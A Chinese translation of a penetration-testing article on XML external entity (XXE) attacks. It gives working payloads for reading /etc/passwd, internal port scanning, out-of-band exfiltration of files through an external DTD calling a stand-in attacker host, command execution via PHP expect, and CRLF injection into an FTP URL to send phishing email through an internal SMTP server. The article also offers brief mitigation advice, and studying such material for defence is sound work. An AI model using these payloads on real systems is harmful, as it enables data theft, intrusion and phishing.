> 原文链接: https://www.anquanke.com//post/id/151944 


# 从XML到RCE（远程代码执行）


                                阅读量   
                                **198310**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：gardienvirtuel.ca
                                <br>原文地址：[https://www.gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php](https://www.gardienvirtuel.ca/fr/actualites/from-xml-to-rce.php)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01077ece9421bfdaff.jpg)](https://p5.ssl.qhimg.com/t01077ece9421bfdaff.jpg)

## 你的web应用是否能够防止XXE攻击

如果你的应用程序允许用户执行上传文件或者提交POST请求的操作，那么它就很可能容易受到XXE攻击。虽然说每天都有大量该漏洞被检测到，但Gardien Virtuel在去年的几次Web应用程序渗透测试中就已经能够利用该漏洞。



## 什么是XXE

XML eXternal Entity（XXE）攻击被列入OWASP 2017年的前十名，并被该组织定义为：

> “[…]一种针对解析XML输入的应用程序的攻击。它实质上是另一种注入类型攻击，如果正确利用，可能非常严重。当包含对外部实体的引用的XML输入是 由弱配置的XML解析器处理时该攻击就会发生。这种攻击可能导致从解析器所在机器泄漏机密数据，拒绝服务，服务器端请求伪造，端口扫描，以及其他一些系统影响[如亿笑-Dos攻击]。”

比如说，当你使用PHP的时候，需要将**libxml_disable_entity_loader**设置为TRUE才能禁用外部实体。



## 漏洞利用介绍

通常情况下，XXE攻击者会创建一个注入XML文件的攻击载荷，执行该载荷<br>
时，将读取服务器上的本地文件，访问内部网络并扫描内部端口。 通过XXE，攻击者能够在本地计算机上读取敏感数据和系统文件，并在某些情况下将其升级为代码执行。 换句话说，XXE是一种从localhost到达各种服务的方法，可能绕过防火墙规则或授权检查。

让我们将下面一段代码作为一个简单的post请求的例子：

```
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

&lt;?xml version="1.0"?&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;XML is the best!&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;

```

上述代码将由服务器的XML处理器解析。 代码被解析后返回：

```
`{`"Request Successful": "Added!"`}`
```

这时候当攻击者试图滥用XML代码解析时会发生什么？让我们来编辑代码，让它包含我们的恶意载荷：

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;
```

这段代码会被执行并且返回

```
`{`"error": "no results for description root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync...
```



## 盲带外XEE（Blind OOB XXE）

如上例所示，服务器将`/etc/passwd`文件的内容作为响应返回给我们的XXE。 而有些情况下虽然实际上没有将响应返回给攻击者的浏览器或代理，但服务器仍然可能受到XXE的攻击。盲带外XXE（OOB XXE）将就允许我们以不同方式利用此漏洞。 由于我们无法直接查看文件内容，因此仍可以扫描内部IP，端口，使用易受攻击的服务器作为代理在外部网络上执行扫描并执行代码。

下面将演示4个漏洞利用场景。

### <a class="reference-link" name="%E5%9C%BA%E6%99%AF1%20-%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"></a>场景1 – 端口扫描

在第一个例子中，受到攻击的服务器对我们的攻击返回了响应。 我们使用文件URI方案将请求指向`/etc/passwd`文件。当然也可以使用http URI方案并强制服务器向我们选择的边界点和端口发送HTTP GET请求，将XXE转换为SSRF（服务器端请求伪造）。

下面的代码将尝试与端口8080通信，并且根据响应时间和/或响应长度，攻击者将知道它是否已打开。

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080" &gt;]&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;
```

### <a class="reference-link" name="%E5%9C%BA%E6%99%AF2%20-%20%E9%80%9A%E8%BF%87DTD%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E6%B8%97%E9%80%8F"></a>场景2 – 通过DTD进行文件渗透

外部文档类型定义（DTD）文件可用于通过让易受远程攻击的服务器获取攻击者托管在VPS上的.dtd文件，并执行该文件中包含的恶意命令来触发OOB XXE。 DTD文件基本上是充当被攻击服务器的指令文件。

以下请求已发送到应用程序以演示和测试此方法：

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data SYSTEM "http://ATTACKERSERVER.com/xxe_file.dtd"&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;
```

上述代码一旦由被攻击的服务器所执行，该服务器就会向我们的远程服务器发送请求，查找包含我们的载荷的DTD文件：

```
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % all "&lt;!ENTITY xxe SYSTEM 'http://ATTACKESERVER.com/?%file;'&gt;"&gt;
%all;
```

花点时间了解一下上述请求的执行流程。 结果是两个请求发送到我们的服务器，其中第二个请求是`/etc/passwd`文件的内容。

在我们的VPS日志中可以看到带有文件内容的第二个请求，它证实了OOB XXE：<br>`http://ATTACKERSERVER.com/?daemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fbin%2Fsh%0Abin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fbin%2Fsh`

### <a class="reference-link" name="%E5%9C%BA%E6%99%AF3-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"></a>场景3 – 远程代码执行

这种情况很少发生，但还是会在一些情况下黑客能够通过XXE执行代码，这主要是由于内部应用程序配置/开发不当。 如果我们很幸运遇到PHP `expect`模块被加载到易受攻击的系统或正在执行XML的内部应用程序上，我们可以执行如下命令：

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;
&lt;catalog&gt;
   &lt;core id="test101"&gt;
      &lt;author&gt;John, Doe&lt;/author&gt;
      &lt;title&gt;I love XML&lt;/title&gt;
      &lt;category&gt;Computers&lt;/category&gt;
      &lt;price&gt;9.99&lt;/price&gt;
      &lt;date&gt;2018-10-01&lt;/date&gt;
      &lt;description&gt;&amp;xxe;&lt;/description&gt;
   &lt;/core&gt;
&lt;/catalog&gt;
```

响应包：<br>``{`"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...`

### <a class="reference-link" name="%E5%9C%BA%E6%99%AF4%20-%20%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"></a>场景4 – 网络钓鱼

我们使用Java的XML解析器找到了一个易受攻击的端点。 扫描内部端口后，我们发现侦听端口25的SMTP服务，Java支持在sun.net.ftp.impl.FtpClient中实现的ftp URI方案。 因此，我们可以指定用户名和密码，例如`ftp:// user:password[@hostport](https://github.com/hostport)/test.txt`，FTP客户端将在连接中发送相应的USER命令。

但这与SMTP和网络钓鱼有什么关系呢？ 接下来就是有趣的部分。如果将`％0D％0A`（CRLF）放在URL的user部分的任何位置，我们就可以终止USER命令并向FTP会话中注入一个新命令，允许我们向端口25发送任意SMTP命令：

```
ftp://a%0D%0A
EHLO%20a%0D%0A
MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
DATA%0D%0A
From%3A%20support%40VULNERABLESYSTEM.com%0A
To%3A%20victim%40gmail.com%0A
Subject%3A%20test%0A
%0A
test!%0A
%0D%0A
.%0D%0A
QUIT%0D%0A
:a@VULNERABLESYSTEM.com:25
```

当FTP客户端使用该URL连接时，以下命令将发送`VULNERABLESYSTEM.com`上的邮件服务器：

```
ftp://a
EHLO a
MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;
RCPT TO: &lt;victim@gmail.com&gt;
DATA
From: support@VULNERABLESYSTEM.com
To: victim@gmail.com
Subject: Reset your password
We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
.
QUIT
:support@VULNERABLESYSTEM.com:25
```

这样攻击者就可以从受信任的源发送钓鱼（例如：帐户重置链接）电子邮件，绕过垃圾邮件过滤器并降低服务的信任。 在可以从执行XML解析的计算机访问到内部邮件服务器的情况下，这个攻击特别有意思。<br>
友情提醒：它甚至允许发送附件;-)



## 推荐几款有用的工具

现在谈到XXE，重要的是能够随时手动编辑Web请求的内容，BurpSuite是推荐的工具之一。 在某些情况下，BurpSuite的扫描功能可以检测潜在的XXE漏洞，但建议手动利用。 如果你设法利用存在XXE漏洞的系统，BurpSuite的Intruder比较适合自动探测开放端口。 通过查看响应时间/响应长度，就可以快速判断端口是否已打开。

RequestBin和HookBin等HTTP请求分析器可用于测试OOB XXE。 BurpSuite Pro’s Collaborator一般来说可以解决这个问题，但是一些安全研究人员更喜欢使用他们自己的VPS。



## 漏洞应对措施

绝不相信你的最终用户。 在本文中，我们可以发现主要问题是在于XML解析器处理用户发送的不受信任的数据上。大多数XML解析器默认易受到XML外部实体攻击。 因此，最佳解决方案是将XML处理器配置为使用本地静态DTD，并在部署应用程序之前禁用XML文档中包含的任何声明的DTD。



## 参考
1. [https://blog.zsec.uk/blind-xxe-learning/](https://blog.zsec.uk/blind-xxe-learning/)
1. [https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/)
1. [https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)
1. [https://mikeknoop.com/lxml-xxe-exploit/](https://mikeknoop.com/lxml-xxe-exploit/)


## XXE相关知识
1. [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injections)
1. [https://www.gracefulsecurity.com/xxe-cheatsheet/](https://www.gracefulsecurity.com/xxe-cheatsheet/)
1. [https://gist.github.com/abdilahrf/63ea0a21dc31010c9c8620425e212e30](https://gist.github.com/abdilahrf/63ea0a21dc31010c9c8620425e212e30)
审核人：yiwang   编辑：边边
